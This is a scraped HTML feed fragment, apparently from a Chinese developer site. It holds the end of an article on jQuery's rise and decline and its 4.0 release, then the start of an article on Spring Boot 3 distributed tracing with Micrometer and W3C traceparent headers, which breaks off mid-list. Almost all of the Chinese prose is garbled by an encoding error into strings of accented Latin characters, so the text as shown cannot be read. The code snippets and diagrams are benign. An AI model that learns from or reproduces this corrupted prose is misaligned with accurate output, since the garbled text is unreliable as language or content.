<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#btn"</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"click"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#box"</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">"active"</span>);
});
</code></pre>
<p>ä½ å¯ä»¥å‘ç°ï¼Œå·®è·å·²ç»ä¸å†é‚£ä¹ˆæ˜æ˜¾ï¼</p>
<h2 data-id="heading-5">6. æ¡†æ¶æ‰“å‡»</h2>
<p>2010 å¹´ï¼ŒReactã€Angularã€Vue ç­‰ç°ä»£æ¡†æ¶ç›¸ç»§ç™»åœºï¼Œå¸¦æ¥äº†é©å‘½æ€§çš„å˜åŒ–ï¼š</p>
<ol>
<li><strong>ç»„ä»¶åŒ–æ€ç»´</strong>ï¼šä» DOM æ“ä½œè½¬å‘ç»„ä»¶æ„å»º</li>
<li><strong>å£°æ˜å¼ç¼–ç¨‹</strong>ï¼šæè¿°â€œä»€ä¹ˆâ€è€Œä¸æ˜¯â€œå¦‚ä½•â€</li>
<li><strong>çŠ¶æ€ç®¡ç†</strong>ï¼šè§£å†³äº†å¤æ‚åº”ç”¨çš„ç»´æŠ¤é—®é¢˜</li>
<li><strong>å·¥å…·é“¾å®Œå–„</strong>ï¼šä»æ„å»ºåˆ°éƒ¨ç½²çš„å®Œæ•´è§£å†³æ–¹æ¡ˆ</li>
</ol>
<p>è¿™äº›æ¡†æ¶ä»æ¶æ„å±‚é¢è§£å†³äº† jQuery æ—¶ä»£çš„é—®é¢˜ï¼Œå°±åƒä»æ‰‹å·¥åˆ¶ä½œè½¬å‘äº†å·¥ä¸šåŒ–ç”Ÿäº§ã€‚</p>
<h2 data-id="heading-6">7. æƒ¨é­èƒŒå›</h2>
<p>2018 å¹´ï¼ŒGitHub å…¬å¼€å®£å¸ƒä»å…¶å‰ç«¯ç§»é™¤ jQueryï¼Œè¿™ä¸ªæ ‡å¿—æ€§äº‹ä»¶è¢«å¹¿æ³›è§£è¯»ä¸ºâ€œjQuery æ—¶ä»£çš„ç»ˆç»“â€ã€‚</p>
<p>GitHub åœ¨åšå®¢ä¸­è¯¦ç»†è¯´æ˜äº†è¿ç§»çš„ç†ç”±ï¼šç°ä»£æµè§ˆå™¨ API å·²ç»è¶³å¤Ÿå®Œå–„ï¼ŒReact çš„ç»„ä»¶åŒ–æ¨¡å¼æ›´é€‚åˆå¤§å‹åº”ç”¨çš„ç»´æŠ¤ã€‚</p>
<p>è¿™ä¸ªâ€œèƒŒå›â€å¯¹ jQuery çš„å£°èª‰é€ æˆäº†é‡å¤§æ‰“å‡»ï¼Œä¹ŸåŠ é€Ÿäº†å®ƒåœ¨æ–°æŠ€æœ¯æ ˆä¸­çš„è¡°è½ã€‚</p>
<h2 data-id="heading-7">8. ç˜¦æ­»éª†é©¼</h2>
<p>å°½ç®¡åœ¨æŠ€æœ¯å‰æ²¿é¢†åŸŸå¤±åŠ¿ï¼Œä½† jQuery åœ¨<strong>å­˜é‡å¸‚åœº</strong>ä¸­çš„åœ°ä½ä¾ç„¶ç¨³å›ºï¼š</p>
<ul>
<li><strong>78% çš„é¡¶çº§ç½‘ç«™</strong>ä»åœ¨ä½¿ç”¨ jQuery</li>
<li><strong>WordPress ç­‰ CMS ç³»ç»Ÿ</strong>å¤§é‡ä¾èµ– jQuery</li>
<li><strong>ä¼ä¸šçº§åº”ç”¨</strong>ä¸­ jQuery ä»£ç åŸºæ•°åºå¤§</li>
</ul>
<p>ä¸ºä»€ä¹ˆä¼ä¸šä¸ç›´æ¥æŠ›å¼ƒ jQueryï¼Ÿ</p>
<p>å› ä¸ºç°å®è¿œæ¯”ç†æƒ³å¤æ‚ï¼š</p>
<ol>
<li><strong>ä¸šåŠ¡é€»è¾‘ä¸ DOM æ·±åº¦è€¦åˆ</strong>ï¼šé‡æ„æˆæœ¬å·¨å¤§</li>
<li><strong>ç¬¬ä¸‰æ–¹æ’ä»¶ä¾èµ–</strong>ï¼šå¾ˆå¤šæ’ä»¶æ²¡æœ‰ç°ä»£æ›¿ä»£æ–¹æ¡ˆ</li>
<li><strong>è¿ç§»é£é™©</strong>ï¼šæ–°åŠŸèƒ½å¼€å‘å—é˜»ï¼Œå½±å“è¥æ”¶</li>
<li><strong>æŠ€èƒ½æ–­å±‚</strong>ï¼šå›¢é˜Ÿå¯¹æ—§æŠ€æœ¯ç†Ÿæ‚‰ï¼Œå¯¹æ–°æŠ€æœ¯é™Œç”Ÿ</li>
</ol>
<p>æ¯”å¦‚ä¸€ä¸ªç”µå•†ç½‘ç«™å¦‚æœè¦é‡æ„æ”¯ä»˜æµç¨‹çš„ jQuery ä»£ç ï¼Œä»»ä½• bug éƒ½å¯èƒ½å¯¼è‡´ç›´æ¥çš„ç»æµæŸå¤±ã€‚è¿™ç§é£é™©è¯„ä¼°è®©å¾ˆå¤šå…¬å¸æœ›è€Œå´æ­¥ã€‚</p>
<p>æ­¤å¤–ï¼ŒWordPress æ”¯æ’‘ç€å…¨çƒ 43% çš„ç½‘ç«™ï¼Œå®ƒçš„æ ¸å¿ƒä»ç„¶ä¾èµ– jQueryã€‚è¿™ä¸ªåºå¤§çš„ç”Ÿæ€ç³»ç»Ÿæ„å‘³ç€ï¼š</p>
<ul>
<li>æ•°åä¸‡ä¸»é¢˜å’Œæ’ä»¶ä¾èµ– jQuery</li>
<li>å†…å®¹ç®¡ç†ç³»ç»Ÿå¯¹ç¨³å®šæ€§çš„è¦æ±‚è¿œè¶…å…ˆè¿›æ€§</li>
<li>æ‰˜ç®¡æœåŠ¡å•†å€¾å‘äºä¿æŒç°æœ‰æŠ€æœ¯æ ˆ</li>
</ul>
<p>æ‰€ä»¥å³ä½¿æ‰€æœ‰å‰ç«¯å¼€å‘è€…éƒ½ä¸å†ä½¿ç”¨ jQueryï¼Œä»… WordPress ç”Ÿæ€ç³»ç»Ÿå°±èƒ½è®©å®ƒç»§ç»­å­˜åœ¨å¾ˆå¤šå¹´ã€‚</p>
<h2 data-id="heading-8">9. æ‹¥æŠ±ç°ä»£</h2>
<p>2026 å¹´ 1 æœˆ 17 æ—¥ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FXhNEPf_5qbiM4W9HGgfzMQ" target="_blank" title="https://mp.weixin.qq.com/s/XhNEPf_5qbiM4W9HGgfzMQ" ref="nofollow noopener noreferrer">jQuery 4.0 æ­£å¼å‘å¸ƒ</a>ï¼Œåœ¨è¿™æ¬¡å‘å¸ƒä¸­ï¼š</p>
<ul>
<li><strong>ç§»é™¤å¯¹ IE11 ä»¥ä¸‹ç‰ˆæœ¬çš„æ”¯æŒ</strong>ï¼šæ‘†è„±å†å²åŒ…è¢±</li>
<li><strong>è¿ç§»åˆ° ES æ¨¡å—</strong>ï¼šä¸ç°ä»£æ„å»ºå·¥å…·å…¼å®¹</li>
<li><strong>å¢åŠ  Trusted Types æ”¯æŒ</strong>ï¼šæå‡å®‰å…¨æ€§</li>
<li><strong>ç§»é™¤å·²å¼ƒç”¨ API</strong>ï¼šæ¸…ç†æŠ€æœ¯å€ºåŠ¡</li>
</ul>
<p>è¿™æ¬¡æ›´æ–°åƒæ˜¯ jQuery é¢å‘ç°ä»£ Web çš„æ–­èˆç¦»ã€‚</p>
<h2 data-id="heading-9">10. ç»“è¯­ï¼šä¸€ä¸ªæ—¶ä»£çš„å®Œç»“</h2>
<p>jQuery 20 å¹´çš„å‘å±•å²ï¼Œå°±æ˜¯ä¸€éƒ¨å‰ç«¯æŠ€æœ¯çš„ç¼©å½±ã€‚</p>
<p>å®ƒä»è§£å†³ç°å®é—®é¢˜å‡ºå‘ï¼Œæ¨åŠ¨äº†æ•´ä¸ªè¡Œä¸šçš„å‘å±•ï¼Œæœ€ç»ˆä¹Ÿéšç€æ—¶ä»£çš„å˜åŒ–è€Œæ·¡å‡ºä¸»æµã€‚</p>
<p>è¿™å¹¶ä¸æ„å‘³ç€ jQuery æ˜¯å¤±è´¥çš„ã€‚æ°æ°ç›¸åï¼Œ<strong>å®ƒè¶…é¢å®Œæˆäº†è‡ªå·±çš„å†å²ä½¿å‘½</strong>ï¼š</p>
<ul>
<li>å®ƒè®©æ— æ•°äººå­¦ä¼šäº†å‰ç«¯å¼€å‘</li>
<li>å®ƒæ¨åŠ¨äº†æµè§ˆå™¨å‚å•†çš„æ ‡å‡†åŒ–</li>
<li>å®ƒå‚¬ç”Ÿäº†ç°ä»£å‰ç«¯ç”Ÿæ€</li>
<li>å®ƒè¯æ˜äº†å¼€æºåä½œçš„åŠ›é‡</li>
</ul>
<p>æ­£å¦‚é‚£å¥ç»å…¸çš„å°è¯ï¼š<strong>â€œå¹¶ä¸æ˜¯è‹±é›„è¿Ÿæš®ï¼Œè€Œæ˜¯æ—¶ä»£éœ€è¦æ–°çš„è‹±é›„ã€‚â€</strong></p>
<p>jQuery 4.0 çš„å‘å¸ƒä¸æ˜¯å›å…‰è¿”ç…§ï¼Œå®ƒå‘Šè¯‰æˆ‘ä»¬ï¼š<strong>æŠ€æœ¯æ²¡æœ‰ç»å¯¹çš„å¯¹é”™ï¼Œåªæœ‰æ˜¯å¦é€‚åˆé‚£ä¸ªæ—¶ä»£çš„éœ€æ±‚</strong>ã€‚</p>
<p>ä»Šå¤©ï¼Œå½“æˆ‘ä»¬åœ¨ Reactã€Vue çš„ç»„ä»¶åŒ–ä¸–ç•Œä¸­å¿™ç¢Œæ—¶ï¼Œå¶å°”å›æœ›ä¸€ä¸‹ jQuery çš„ç®€å•ä¼˜é›…ï¼Œä¹Ÿè®¸èƒ½è·å¾—ä¸€äº›å…³äº<strong>æŠ€æœ¯æœ¬è´¨</strong>çš„æ€è€ƒï¼š</p>
<p><strong>å¥½çš„å·¥å…·åº”è¯¥è®©äººæ›´ä¸“æ³¨äºåˆ›é€ ä»·å€¼ï¼Œè€Œä¸æ˜¯è¢«æŠ€æœ¯æœ¬èº«æ‰€å›°æ‰°ã€‚</strong></p>
<p>æˆ‘æ˜¯å†´ç¾½ï¼Œ10 å¹´ç¬”è€•ä¸è¾ï¼Œä¸“æ³¨å‰ç«¯é¢†åŸŸï¼Œæ›´æ–°äº† 10+ ç³»åˆ—ã€300+ ç¯‡åŸåˆ›æŠ€æœ¯æ–‡ç« ï¼Œç¿»è¯‘è¿‡ Svelteã€Solid.jsã€TypeScript æ–‡æ¡£ï¼Œè‘—æœ‰å°å†Œã€ŠNext.js å¼€å‘æŒ‡å—ã€‹ã€ã€ŠSvelte å¼€å‘æŒ‡å—ã€‹ã€ã€ŠAstro å®æˆ˜æŒ‡å—ã€‹ã€‚</p>
<p>æ¬¢è¿å›´è§‚æˆ‘çš„â€œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">ç½‘é¡µç‰ˆæœ‹å‹åœˆ</a>â€ï¼Œå…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼š<strong>å†´ç¾½ï¼ˆæˆ–æœç´¢ yayujsï¼‰</strong>ï¼Œæ¯å¤©åˆ†äº«å‰ç«¯çŸ¥è¯†ã€AI å¹²è´§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»åŸç†åˆ°æŠ½è±¡ï¼šSpring Boot 3 é“¾è·¯è¿½è¸ªæ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7596874392824283178</link>    <guid>https://juejin.cn/post/7596874392824283178</guid>    <pubDate>2026-01-19T07:38:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596874392824283178" data-draft-id="7596874392824266794" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»åŸç†åˆ°æŠ½è±¡ï¼šSpring Boot 3 é“¾è·¯è¿½è¸ªæ·±åº¦è§£æ"/> <meta itemprop="keywords" content="åç«¯,æ¶æ„,å¾®æœåŠ¡"/> <meta itemprop="datePublished" content="2026-01-19T07:38:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¸æµªæ— ç—•"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»åŸç†åˆ°æŠ½è±¡ï¼šSpring Boot 3 é“¾è·¯è¿½è¸ªæ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¸æµªæ— ç—•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T07:38:48.000Z" title="Mon Jan 19 2026 07:38:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    28
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« <a href="https://juejin.cn/post/7583325900294717440" target="_blank" title="https://juejin.cn/post/7583325900294717440">ã€Šå‘Šåˆ«æ‰‹å†™ TraceIdï¼Micrometer é“¾è·¯è¿½è¸ªåœ¨ Spring Boot ä¸­çš„è½åœ°å®è·µã€‹</a>ä¸­ï¼Œæˆ‘ä»¬è¯¦ç»†ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨ Spring Boot 3 + Micrometer Tracing å®ç°åˆ†å¸ƒå¼é“¾è·¯è¿½è¸ªï¼ŒåŒ…æ‹¬ OpenFeignã€RestTemplateã€å¼‚æ­¥è°ƒç”¨ä¸‰ç§åœºæ™¯çš„å®Œæ•´é…ç½®å’ŒéªŒè¯ã€‚</p>
<p>é‚£ç¯‡æ–‡ç« è§£å†³äº†"æ€ä¹ˆåš"çš„é—®é¢˜ï¼Œä½†å¦‚æœä½ æƒ³çœŸæ­£ç†è§£ï¼š</p>
<ul>
<li>ä¸ºä»€ä¹ˆ Micrometer èƒ½è‡ªåŠ¨ä¼ é€’ TraceIdï¼Ÿ</li>
<li>RestTemplateã€OpenFeignã€å¼‚æ­¥è°ƒç”¨çš„ä¼ æ’­æœºåˆ¶æœ‰ä»€ä¹ˆå…±æ€§ï¼Ÿ</li>
<li>W3C Trace Context æ ‡å‡†æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ</li>
<li>Micrometer çš„è®¾è®¡æ€æƒ³æ˜¯ä»€ä¹ˆï¼Ÿ</li>
</ul>
<p>é‚£ä¹ˆè¿™ç¯‡æ–‡ç« å°†ä»<strong>åŸç†å±‚é¢</strong>å’Œ<strong>æŠ½è±¡å±‚é¢</strong>ç»™ä½ ç­”æ¡ˆã€‚</p>
<h2 data-id="heading-1">ä¸€ã€é—®é¢˜çš„èµ·ç‚¹ï¼šå¾®æœåŠ¡è°ƒç”¨é“¾ä¸­çš„ç›²åŒº</h2>
<p>åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œä¸€ä¸ªç”¨æˆ·è¯·æ±‚å¾€å¾€ä¼šç»è¿‡å¤šä¸ªæœåŠ¡ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">ç”¨æˆ·è¯·æ±‚ â†’ ç”¨æˆ·æœåŠ¡ â†’ å•†å“æœåŠ¡ â†’ åº“å­˜æœåŠ¡
<span class="hljs-code">                  â†“
              è®¢å•æœåŠ¡ â†’ æ”¯ä»˜æœåŠ¡
</span></code></pre>
<p>å½“æŸä¸ªè¯·æ±‚å‡ºç°æ€§èƒ½é—®é¢˜æ—¶ï¼Œæˆ‘ä»¬é¢ä¸´çš„å›°å¢ƒæ˜¯ï¼š</p>
<ol>
<li><strong>æ— æ³•å…³è”æ—¥å¿—</strong>ï¼šæ¯ä¸ªæœåŠ¡éƒ½æœ‰è‡ªå·±çš„æ—¥å¿—ï¼Œä½†ä½ ä¸çŸ¥é“å“ªäº›æ—¥å¿—å±äºåŒä¸€ä¸ªè¯·æ±‚</li>
<li><strong>æ— æ³•å®šä½ç“¶é¢ˆ</strong>ï¼šæ€»è€—æ—¶10ç§’ï¼Œä½†ä¸çŸ¥é“æ…¢åœ¨å“ªä¸ªæœåŠ¡ã€å“ªä¸ªè°ƒç”¨ç¯èŠ‚</li>
<li><strong>æ— æ³•è¿½è¸ªå¼‚æ­¥</strong>ï¼šå¼‚æ­¥ä»»åŠ¡æ‰§è¡Œæ—¶ï¼Œå·²ç»è„±ç¦»äº†åŸå§‹è¯·æ±‚çš„ä¸Šä¸‹æ–‡</li>
</ol>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆéœ€è¦é“¾è·¯è¿½è¸ªã€‚</p>
<h2 data-id="heading-2">äºŒã€é“¾è·¯è¿½è¸ªçš„æœ¬è´¨ï¼šç»™è¯·æ±‚ä¸€ä¸ªå…¨å±€èº«ä»½</h2>
<h3 data-id="heading-3">2.1 æ ¸å¿ƒæ¦‚å¿µ</h3>
<p>é“¾è·¯è¿½è¸ªçš„æ ¸å¿ƒæ˜¯<strong>ç»™æ¯ä¸ªè¯·æ±‚åˆ†é…ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„IDï¼ˆtraceIdï¼‰ï¼Œå¹¶åœ¨æ•´ä¸ªè°ƒç”¨é“¾ä¸­ä¼ é€’è¿™ä¸ªID</strong>ã€‚</p>
<p>æƒ³è±¡ä¸€ä¸‹å¿«é€’åŒ…è£¹ï¼š</p>
<ul>
<li><strong>traceId</strong> å°±æ˜¯å¿«é€’å•å·ï¼Œä»å‘è´§åˆ°æ”¶è´§å§‹ç»ˆä¸å˜</li>
<li><strong>spanId</strong> å°±æ˜¯æ¯ä¸ªä¸­è½¬ç«™çš„è®°å½•ï¼Œæ¯åˆ°ä¸€ä¸ªç«™ç‚¹éƒ½æœ‰æ–°çš„ç¼–å·</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[æµè§ˆå™¨] --&gt;|traceId: abc123&lt;br/&gt;spanId: span1| B[ç”¨æˆ·æœåŠ¡]
    B --&gt;|traceId: abc123&lt;br/&gt;spanId: span2| C[å•†å“æœåŠ¡]
    C --&gt;|traceId: abc123&lt;br/&gt;spanId: span3| D[åº“å­˜æœåŠ¡]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
    style D fill:#e1ffe1
</code></pre>
<p>è¿™æ ·ï¼Œå½“ä½ åœ¨æ—¥å¿—ç³»ç»Ÿä¸­æœç´¢ <code>traceId: abc123</code> æ—¶ï¼Œå°±èƒ½æ‰¾åˆ°è¿™ä¸ªè¯·æ±‚åœ¨æ‰€æœ‰æœåŠ¡ä¸­çš„æ‰€æœ‰æ—¥å¿—ã€‚</p>
<h3 data-id="heading-4">2.2 W3C Trace Context æ ‡å‡†</h3>
<p>Spring Boot 3 é‡‡ç”¨ W3C Trace Context æ ‡å‡†ï¼Œé€šè¿‡ HTTP å¤´ <code>traceparent</code> ä¼ é€’é“¾è·¯ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01</span>
             â†‘  â†‘                                â†‘                  â†‘
             â”‚  â””â”€ traceId (32ä½16è¿›åˆ¶)          â””â”€ spanId (16ä½)   â””â”€ æ ‡å¿—ä½
             â””â”€ ç‰ˆæœ¬å·
</code></pre>
<p>åªéœ€è¦å…³æ³¨ä¸¤ä¸ªå­—æ®µï¼š</p>
<ul>
<li><strong>traceId</strong>ï¼šè¿™æ¬¡è¯·æ±‚çš„å…¨å±€IDï¼Œæ‰€æœ‰æœåŠ¡å…±äº«</li>
<li><strong>spanId</strong>ï¼šå½“å‰æœåŠ¡/æ­¥éª¤çš„IDï¼Œæ¯ä¸ªæœåŠ¡éƒ½ä¸åŒ</li>
</ul>
<h2 data-id="heading-5">ä¸‰ã€åŸç†è§£æï¼šMicrometer Tracing æ¶æ„</h2>
<h3 data-id="heading-6">3.1 ä» Spring Cloud Sleuth åˆ° Micrometer</h3>
<p>Spring Boot 2.x æ—¶ä»£ï¼Œé“¾è·¯è¿½è¸ªç”± Spring Cloud Sleuth è´Ÿè´£ã€‚åˆ°äº† Spring Boot 3.xï¼Œå®˜æ–¹å°†é“¾è·¯è¿½è¸ªæ•´åˆåˆ° Micrometer ç”Ÿæ€ï¼š</p>

























<table><thead><tr><th>ç»„ä»¶</th><th>èŒè´£</th></tr></thead><tbody><tr><td><code>micrometer-observation</code></td><td>è§‚æµ‹æŠ½è±¡å±‚ï¼Œç»Ÿä¸€æŒ‡æ ‡ã€è¿½è¸ªã€æ—¥å¿—</td></tr><tr><td><code>micrometer-tracing</code></td><td>é“¾è·¯è¿½è¸ªçš„æ ¸å¿ƒæ¥å£</td></tr><tr><td><code>micrometer-tracing-bridge-brave</code></td><td>ä¸ Braveï¼ˆZipkinï¼‰çš„æ¡¥æ¥å®ç°</td></tr><tr><td><code>context-propagation</code></td><td>ä¸Šä¸‹æ–‡ä¼ æ’­ï¼ˆå¤šçº¿ç¨‹åœºæ™¯ï¼‰</td></tr></tbody></table>
<p>è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼š<strong>é“¾è·¯è¿½è¸ªä¸å†æ˜¯å­¤ç«‹çš„åŠŸèƒ½ï¼Œè€Œæ˜¯æ•´ä¸ªå¯è§‚æµ‹æ€§ä½“ç³»çš„ä¸€éƒ¨åˆ†</strong>ã€‚</p>
<h3 data-id="heading-7">3.2 æ•´ä½“å·¥ä½œæµç¨‹</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph Client[å®¢æˆ·ç«¯/ç½‘å…³]
        A[HTTP è¯·æ±‚]
        A --&gt; B{æ˜¯å¦æœ‰&lt;br/&gt;traceparent?}
        B --&gt;|æœ‰| C[å¤ç”¨ traceId]
        B --&gt;|æ— | D[ç”Ÿæˆæ–° traceId]
    end
    
    subgraph Service1[ç”¨æˆ·æœåŠ¡]
        E[HTTP Filter] --&gt; F[W3CPropagation&lt;br/&gt;æå–å™¨]
        F --&gt; G[TraceContext&lt;br/&gt;ç»‘å®šåˆ° ThreadLocal]
        G --&gt; H[ä¸šåŠ¡é€»è¾‘æ‰§è¡Œ]
        H --&gt; I{éœ€è¦è°ƒç”¨&lt;br/&gt;ä¸‹æ¸¸æœåŠ¡?}
        I --&gt;|æ˜¯| J[W3CPropagation&lt;br/&gt;æ³¨å…¥å™¨]
    end
    
    subgraph Service2[å•†å“æœåŠ¡]
        K[HTTP Filter] --&gt; L[æå– traceparent]
        L --&gt; M[ç»§æ‰¿ traceId&lt;br/&gt;åˆ›å»ºæ–° spanId]
    end
    
    C --&gt; E
    D --&gt; E
    J --&gt; K
    
    style Client fill:#e1f5ff
    style Service1 fill:#fff4e1
    style Service2 fill:#ffe1f5
</code></pre>
<p>æ ¸å¿ƒæµç¨‹åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>å…¥å£é˜¶æ®µ</strong>ï¼šHTTP Filter æ‹¦æˆªè¯·æ±‚ï¼Œæå–æˆ–åˆ›å»º TraceContext</li>
<li><strong>ç»‘å®šé˜¶æ®µ</strong>ï¼šå°† TraceContext ç»‘å®šåˆ°å½“å‰çº¿ç¨‹çš„ ThreadLocal</li>
